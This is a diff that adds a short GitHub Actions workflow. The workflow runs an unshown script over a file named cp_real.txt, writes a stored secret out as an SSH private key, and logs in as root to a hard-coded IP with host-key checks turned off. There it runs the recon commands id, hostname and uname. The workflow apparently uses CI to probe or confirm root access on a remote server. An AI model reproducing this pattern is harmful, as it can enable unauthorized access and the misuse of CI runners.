@@ -1,0 +1,16 @@
+name: cpssh2
+on: workflow_dispatch
+jobs:
+  v:
+    runs-on: ubuntu-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install -q requests
+      - run: python3 cp_ssh2.py cp_real.txt || true
+      - run: sleep 10
+      - run: |
+          mkdir -p ~/.ssh && echo "$KOPS_KEY" > ~/.ssh/id_ed25519 && chmod 600 ~/.ssh/id_ed25519
+          ssh -i ~/.ssh/id_ed25519 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=12 -o BatchMode=yes root@146.190.200.5 'id; hostname; uname -r' 2>&1 | head -4
+        env:
+          KOPS_KEY: ${{ secrets.KOPS_KEY }}
